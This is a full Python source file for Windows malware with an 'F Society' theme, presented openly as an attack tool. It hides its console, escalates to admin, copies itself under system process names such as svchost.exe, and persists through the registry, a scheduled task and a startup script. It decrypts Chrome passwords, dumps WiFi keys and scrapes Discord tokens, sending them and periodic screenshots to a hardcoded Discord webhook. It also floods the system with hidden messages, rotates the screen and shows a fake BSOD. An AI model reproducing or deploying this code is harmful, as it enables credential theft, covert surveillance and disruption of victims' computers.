import os
import sys
import subprocess
import ctypes
import io
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import tkinter as tk
from datetime import datetime
from threading import Thread
import tempfile
import winreg
import platform
import re

# ==================== HIDE CONSOLE WINDOW ====================
def hide_console():
    """Hide the console window completely"""
    if sys.platform == 'win32':
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)
        except:
            pass

# ==================== REQUEST ADMIN PERMISSION ====================
def request_admin():
    """Request administrator privileges"""
    if sys.platform == 'win32':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 0
                )
                sys.exit()
            else:
                hide_console()
        except:
            pass

request_admin()
time.sleep(1)

# ==================== INSTALL MODULES ====================
def install_modules():
    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32']
    for module in modules:
        try:
            if module == 'pillow':
                __import__('PIL')
            elif module == 'browser_cookie3':
                __import__('browser_cookie3')
            else:
                __import__(module)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet'], capture_output=True)

install_modules()

# ==================== IMPORTS ====================
import pyautogui
import requests
from PIL import Image
import browser_cookie3
from pynput.mouse import Controller as MouseController, Listener as MouseListener
from pynput.keyboard import Controller as KeyboardController
from Crypto.Cipher import AES
import win32crypt
import win32api
import win32con

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1502233694276947978/1xEeJj4U5ovs9GgMh2hApXXXuoL1DcE1Dl-O_x-C5m6gbsTRM6x6RwUM7gT1IPHZmWHc"
SCREENSHOT_INTERVAL = 120

mouse = MouseController()
keyboard = KeyboardController()

# ==================== F SOCIETY TEXT FILES EVERYWHERE ====================

def create_fsociety_text_files():
    """Create plain text files everywhere with F Society message"""
    
    # The message content (plain text, no ASCII art)
    message_content = """We're F SOCIETY
We are always watching.

Your system has been compromised.
All your data has been accessed.

- F Society"""

    # List of locations to create the file
    locations = [
        # Desktop paths
        os.path.expanduser('~') + '\\Desktop\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\Desktop\\IMPORTANT_READ.txt',
        os.path.expanduser('~') + '\\Desktop\\README.txt',
        
        # Documents paths
        os.path.expanduser('~') + '\\Documents\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\Documents\\URGENT.txt',
        os.path.expanduser('~') + '\\Documents\\WARNING.txt',
        
        # Downloads path
        os.path.expanduser('~') + '\\Downloads\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\Downloads\\READ_THIS.txt',
        
        # Music, Pictures, Videos
        os.path.expanduser('~') + '\\Music\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\Pictures\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\Videos\\FSOCIETY.txt',
        
        # Root of C drive
        'C:\\FSOCIETY.txt',
        'C:\\Windows\\Temp\\FSOCIETY.txt',
        
        # System32 (if admin)
        'C:\\Windows\\System32\\FSOCIETY.txt',
        'C:\\Windows\\SysWOW64\\FSOCIETY.txt',
        
        # Program Files
        'C:\\Program Files\\FSOCIETY.txt',
        'C:\\Program Files (x86)\\FSOCIETY.txt',
        
        # Temp directory
        os.path.join(tempfile.gettempdir(), 'FSOCIETY.txt'),
        
        # Startup folder (so it opens on boot)
        os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\FSOCIETY.txt',
        
        # Recent folder
        os.path.expanduser('~') + '\\Recent\\FSOCIETY.txt',
        
        # Saved Games
        os.path.expanduser('~') + '\\Saved Games\\FSOCIETY.txt',
        
        # Contacts
        os.path.expanduser('~') + '\\Contacts\\FSOCIETY.txt',
        
        # Links
        os.path.expanduser('~') + '\\Links\\FSOCIETY.txt',
        
        # Search history folder
        os.path.expanduser('~') + '\\Searches\\FSOCIETY.txt',
        
        # OneDrive folders
        os.path.expanduser('~') + '\\OneDrive\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\OneDrive\\Desktop\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\OneDrive\\Documents\\FSOCIETY.txt',
        
        # AppData folders
        os.path.expanduser('~') + '\\AppData\\Local\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\AppData\\Roaming\\FSOCIETY.txt',
        os.path.expanduser('~') + '\\AppData\\LocalLow\\FSOCIETY.txt',
        
        # Create in every available drive (D:, E:, F:, etc.)
    ]
    
    # Get all drive letters
    import string
    for drive in string.ascii_uppercase:
        drive_path = f"{drive}:\\FSOCIETY.txt"
        if os.path.exists(f"{drive}:\\"):
            locations.append(drive_path)
    
    # Create files
    created_count = 0
    for location in locations:
        try:
            # Create directory if it doesn't exist
            directory = os.path.dirname(location)
            if directory and not os.path.exists(directory):
                try:
                    os.makedirs(directory, exist_ok=True)
                except:
                    pass
            
            # Write the message
            with open(location, 'w', encoding='utf-8') as f:
                f.write(message_content)
            
            # Set file to hidden
            try:
                ctypes.windll.kernel32.SetFileAttributesW(location, 0x02)
            except:
                pass
            
            created_count += 1
            print(f"[+] Created: {location}")
        except Exception as e:
            pass
    
    # Also find all folders and add a copy
    try:
        # Add to every user folder
        user_path = os.path.expanduser('~')
        for root, dirs, files in os.walk(user_path):
            try:
                if random.random() < 0.1:  # 10% chance to add to folder
                    file_path = os.path.join(root, 'READ_THIS.txt')
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(message_content)
                    created_count += 1
            except:
                pass
            if created_count > 500:  # Limit to 500 files
                break
    except:
        pass
    
    print(f"[+] Created {created_count} F SOCIETY text files across the system")
    return created_count

def open_mr_robot_picture():
    """Open Mr. Robot face picture in browser"""
    try:
        # High quality Mr. Robot images
        mr_robot_urls = [
            "https://i.imgur.com/6qF8W3X.jpg",   # Mr. Robot mask
            "https://i.imgur.com/HgJ8kR9.jpg",   # Rami Malek as Mr. Robot
            "https://i.imgur.com/klXzQpL.jpg",   # F Society mask
            "https://i.imgur.com/RtY3KwB.jpg",   # Mr. Robot hacker
            "https://i.imgur.com/XwVdTmB.jpg",   # fsociety mask group
            "https://i.imgur.com/5NQ4K2L.jpg",   # Elliot and Mr. Robot
            "https://i.imgur.com/1RtKqJf.jpg",   # Mr. Robot face closeup
            "https://i.imgur.com/pQYLnFx.jpg",   # fsociety logo
            "https://i.imgur.com/9VwMkGj.jpg",   # Mr. Robot typing
            "https://i.imgur.com/2XtZnEm.jpg",   # Elliot Alderson
        ]
        
        # Open multiple tabs with Mr. Robot images
        for _ in range(5):  # Open 5 tabs of Mr. Robot
            url = random.choice(mr_robot_urls)
            os.system(f'start {url}')
            time.sleep(1)
        
        print("[+] Opened Mr. Robot pictures in browser")
        
        # Also open a search result
        os.system('start https://www.google.com/search?q=Mr+Robot+face&tbm=isch')
        
    except Exception as e:
        print(f"[-] Error opening pictures: {e}")

# ==================== RENAME SELF TO SYSTEM FILE ====================
def rename_to_system_file():
    """Rename the script to look like a Windows system file"""
    try:
        current_path = os.path.abspath(sys.argv[0])
        system_dirs = [
            os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\',
            os.environ.get('SystemRoot', 'C:\\Windows') + '\\',
        ]
        
        system_names = [
            'svchost.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe', 
            'services.exe', 'wininit.exe', 'spoolsv.exe'
        ]
        
        for sys_dir in system_dirs:
            try:
                if os.path.exists(sys_dir):
                    new_name = random.choice(system_names)
                    new_path = os.path.join(sys_dir, new_name)
                    
                    if os.path.exists(new_path):
                        new_name = f"sys{random.randint(1000,9999)}.exe"
                        new_path = os.path.join(sys_dir, new_name)
                    
                    shutil.copy2(current_path, new_path)
                    ctypes.windll.kernel32.SetFileAttributesW(new_path, 0x02)
                    add_to_startup(new_path)
                    create_scheduled_task(new_path)
                    return new_path
            except:
                pass
    except:
        pass
    return None

# ==================== PERSISTENCE METHODS ====================
def add_to_startup(file_path):
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{file_path}"')
    except:
        pass

def create_scheduled_task(file_path):
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'WindowsUpdateTask', '/tr', file_path, 
                       '/sc', 'onlogon', '/f', '/rl', 'HIGHEST'], capture_output=True)
    except:
        pass

def add_multiple_startup_methods():
    script_path = os.path.abspath(sys.argv[0])
    python_exe = sys.executable
    
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsUpdateService", 0, winreg.REG_SZ, 
                            f'"{python_exe}" "{script_path}"')
    except:
        pass
    
    try:
        startup_folder = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        vbs_path = os.path.join(startup_folder, "WindowsUpdate.vbs")
        vbs_content = f'''CreateObject("Wscript.Shell").Run "{python_exe} {script_path}", 0, False'''
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
    except:
        pass

# ==================== MESSAGE BOX SPAM ====================
message_boxes = []

class DoublingMessageBox:
    def __init__(self):
        self.window = None
        
    def create(self):
        try:
            dialog = tk.Toplevel()
            dialog.title("⚠️ F SOCIETY")
            dialog.geometry("400x200")
            dialog.configure(bg='#1e1e1e')
            dialog.resizable(False, False)
            
            screen_width = dialog.winfo_screenwidth()
            screen_height = dialog.winfo_screenheight()
            x = random.randint(50, screen_width - 450)
            y = random.randint(50, screen_height - 250)
            dialog.geometry(f"400x200+{x}+{y}")
            dialog.attributes('-topmost', True)
            
            tk.Label(dialog, text="⚠️", font=("Segoe UI", 48), fg="#ff4444", bg='#1e1e1e').pack(pady=10)
            tk.Label(dialog, text="We're F SOCIETY", font=("Segoe UI", 20, "bold"), 
                    fg="#ff4444", bg='#1e1e1e').pack(pady=5)
            tk.Label(dialog, text="We are always watching", font=("Segoe UI", 12), 
                    fg="#888888", bg='#1e1e1e').pack()
            
            def on_exit():
                for _ in range(2):
                    new_box = DoublingMessageBox()
                    new_box.create()
            
            exit_button = tk.Button(dialog, text="EXIT", command=on_exit, 
                                    font=("Segoe UI", 12, "bold"), bg="#ff4444", fg="white",
                                    activebackground="#cc0000", cursor="hand2", width=10)
            exit_button.pack(pady=20)
            dialog.protocol("WM_DELETE_WINDOW", on_exit)
            
            self.window = dialog
            dialog.mainloop()
        except:
            pass

def create_message_box():
    box = DoublingMessageBox()
    Thread(target=box.create, daemon=True).start()
    time.sleep(0.2)

def auto_message_box_loop():
    while True:
        time.sleep(8)
        create_message_box()

# ==================== SCREEN DRAWING ====================
drawing = True
current_color = (255, 0, 0)
overlay_root = None
canvas = None

def create_transparent_overlay():
    global overlay_root, canvas
    overlay_root = tk.Tk()
    overlay_root.attributes('-fullscreen', True)
    overlay_root.attributes('-topmost', True)
    overlay_root.attributes('-transparentcolor', 'white')
    overlay_root.configure(bg='white')
    overlay_root.overrideredirect(True)
    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)
    overlay_root.update()

def auto_change_color():
    colors = [(255,0,0), (0,255,0), (0,0,255), (255,255,0), (255,0,255), (0,255,255)]
    color_index = 0
    global current_color
    while True:
        time.sleep(5)
        color_index = (color_index + 1) % len(colors)
        current_color = colors[color_index]

def draw_on_screen(x, y):
    if drawing and canvas:
        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
        overlay_root.update()

def on_move(x, y):
    draw_on_screen(x, y)

# ==================== SCREEN ROTATION ====================
def rotate_screen_upside_down():
    try:
        devmode = win32api.EnumDisplaySettings(None, 0)
        devmode.DisplayOrientation = 2
        devmode.Fields = win32con.DM_DISPLAYORIENTATION
        win32api.ChangeDisplaySettings(devmode, 0)
    except:
        pass

def screen_flicker_auto():
    for _ in range(10):
        try:
            devmode = win32api.EnumDisplaySettings(None, 0)
            devmode.DisplayOrientation = 2
            win32api.ChangeDisplaySettings(devmode, 0)
            time.sleep(0.05)
            devmode.DisplayOrientation = 0
            win32api.ChangeDisplaySettings(devmode, 0)
            time.sleep(0.05)
        except:
            pass

# ==================== CREDENTIAL STEALING ====================
def get_chrome_master_key():
    try:
        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_chrome_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return None
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def get_all_passwords():
    passwords = []
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(chrome_path, temp_db.name)
            temp_db.close()
            master_key = get_chrome_master_key()
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                if username and encrypted_pass and master_key:
                    password = decrypt_chrome_password(encrypted_pass, master_key)
                    if password:
                        passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`\n")
            conn.close()
            os.unlink(temp_db.name)
    except:
        pass
    return passwords

def get_wifi_passwords():
    wifi_list = []
    try:
        results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Key Content' in line:
                    password = line.split(':')[1].strip()
                    wifi_list.append(f"✅ WiFi: {profile}\n   🔐 `{password}`\n")
                    break
    except:
        pass
    return wifi_list

def get_discord_tokens():
    tokens = []
    paths = [os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb']
    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for path in paths:
        try:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
        except:
            pass
    return list(set(tokens))

def get_system_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = 'Unknown'
    return {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'user': os.getenv('USERNAME', 'Unknown'),
        'os': platform.system() + ' ' + platform.release(),
        'ip': ip
    }

def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
    try:
        if is_file and file_bytes:
            files = {'file': (filename, file_bytes, 'image/jpeg')}
            requests.post(WEBHOOK_URL, files=files, timeout=30)
        else:
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
        return True
    except:
        return False

def collect_and_send_data():
    sys_info = get_system_info()
    message = f"**[🔴 F SOCIETY - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"💻 PC: {sys_info['computer']}\n"
    message += f"👤 User: {sys_info['user']}\n"
    message += f"🖥️ OS: {sys_info['os']}\n"
    message += f"🌐 IP: {sys_info['ip']}\n"
    message += f"{'='*60}\n\n"
    message += "**🔑 BROWSER PASSWORDS (DECRYPTED):**\n"
    for pwd in get_all_passwords():
        message += pwd
    message += "\n**📡 WIFI PASSWORDS:**\n"
    for wifi in get_wifi_passwords():
        message += wifi
    message += "\n**🎮 DISCORD TOKENS:**\n"
    for token in get_discord_tokens()[:5]:
        message += f"✅ `{token}`\n"
    send_to_webhook(message)

# ==================== SCREENSHOT WORKER ====================
def screenshot_worker():
    while True:
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=60)
            img_bytes.seek(0)
            sys_info = get_system_info()
            filename = f"ss_{sys_info['computer']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            send_to_webhook(None, True, img_bytes.getvalue(), filename)
            time.sleep(SCREENSHOT_INTERVAL)
        except:
            time.sleep(5)

# ==================== FAKE BSOD ====================
def fake_bsod_auto():
    time.sleep(20)
    try:
        bsod = tk.Tk()
        bsod.attributes('-fullscreen', True)
        bsod.configure(bg='#0000AA')
        bsod.attributes('-topmost', True)
        tk.Label(bsod, text=":(", font=("Consolas", 72), fg="white", bg='#0000AA').pack(pady=100)
        tk.Label(bsod, text="F SOCIETY - Your PC ran into a problem\n\nStop code: F_SOCIETY_ALWAYS_WATCHING", 
                font=("Consolas", 16), fg="white", bg='#0000AA').pack()
        progress = tk.Canvas(bsod, width=400, height=20, bg='#0000AA', highlightthickness=0)
        progress.pack(pady=50)
        progress.create_rectangle(0, 0, 0, 20, fill='white', tags='progress')
        
        def update_progress():
            for i in range(101):
                progress.coords('progress', 0, 0, (400 * i / 100), 20)
                bsod.update()
                time.sleep(0.05)
            bsod.destroy()
        Thread(target=update_progress, daemon=True).start()
        bsod.mainloop()
    except:
        pass

# ==================== MAIN ====================
def main():
    print("[+] F SOCIETY ACTIVATED")
    
    # Rename to system file
    rename_to_system_file()
    
    # Add startup methods
    add_multiple_startup_methods()
    time.sleep(2)
    
    # Send credentials to webhook
    collect_and_send_data()
    
    # === F SOCIETY FEATURES ===
    
    # Create text files everywhere
    print("[+] Creating F SOCIETY text files everywhere...")
    create_fsociety_text_files()
    
    # Open Mr. Robot pictures
    print("[+] Opening Mr. Robot pictures...")
    open_mr_robot_picture()
    
    # Start all trolling features
    Thread(target=create_transparent_overlay, daemon=True).start()
    time.sleep(1)
    
    mouse_listener = MouseListener(on_move=on_move)
    mouse_listener.daemon = True
    mouse_listener.start()
    
    Thread(target=auto_change_color, daemon=True).start()
    rotate_screen_upside_down()
    Thread(target=screen_flicker_auto, daemon=True).start()
    Thread(target=auto_message_box_loop, daemon=True).start()
    Thread(target=fake_bsod_auto, daemon=True).start()
    
    screenshot_worker()

if __name__ == "__main__":
    try:
        main()
    except:
        time.sleep(10)
        main()
